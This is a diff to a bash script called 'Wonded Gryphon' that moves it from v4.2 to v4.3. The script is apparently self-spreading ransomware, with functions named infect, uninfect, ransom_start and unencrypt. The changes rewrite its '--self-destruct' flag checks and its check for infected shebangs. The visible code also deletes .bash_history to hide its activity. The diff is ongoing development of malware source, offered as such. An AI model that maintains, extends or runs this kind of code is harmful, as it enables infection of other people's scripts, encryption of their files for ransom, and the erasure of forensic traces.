@@ -12,7 +12,7 @@
 #   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
 #    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
 #       /   \/       \/    |__|        \/      \     \/ ---------
-#      / Wonded Gryphon v4.2  ______----------- # ---------------
+#      / Wonded Gryphon v4.3  ______----------- # ---------------
 #     #          _______,---'__,---' ---------------------------
 #            _,-'---_---__,---' -----------------------------
 #     /_ #   (,  ---____', --------------------------------
@@ -38,7 +38,7 @@ ME="$0"
 
 CAT=$(cat "$ME")
 
-VERSION="v4.2"
+VERSION="v4.3"
 
 OFLAG="$1"
 
@@ -383,7 +383,7 @@ function infect() {
    if [ "$INFECTCOUNT" == "$MAXINFECTCOUNT" ]
 
    then
-      if [ "$@" =~ .*"--self-destruct" ]
+      if grep -q --self-destruct <<<"$@"
 
       then
          echo -e "$BBlue Done...$NC"
@@ -548,7 +548,7 @@ function ransom_start() {
    cd "$HOME" && rm .bash_history
    sleep 5
    
-   if [ "$@" =~ .*"--self-destruct" ]
+   if grep -q --self-destruct <<<"$@"
 
    then
       echo -e "$BBlue Done...$NC"
@@ -568,7 +568,7 @@ function remcheck() {
    
    local IFBASH=$(grep -Fx "$SHEBANG" *)
    
-   if [ "$IFBASH" =~ .*"$SHEBANG" ]
+   if grep -q "$SHEBANG" <<<"$IFBASH"
 
    then
       
@@ -633,7 +633,7 @@ function uninfect() {
 
    then
    
-      if [ "$@" =~ .*"--self-destruct" ]
+      if grep -q --self-destruct <<<"$@"
    
       then
          echo -e "$BBlue Done...$NC"
@@ -739,7 +739,7 @@ function unencrypt() {
    cd "$HOME" && rm .bash_history
    sleep 5
    
-   if [ "$@" =~ .*"--self-destruct" ]
+   if grep -q --self-destruct <<<"$@"
 
    then
       echo -e "$BBlue Done...$NC"
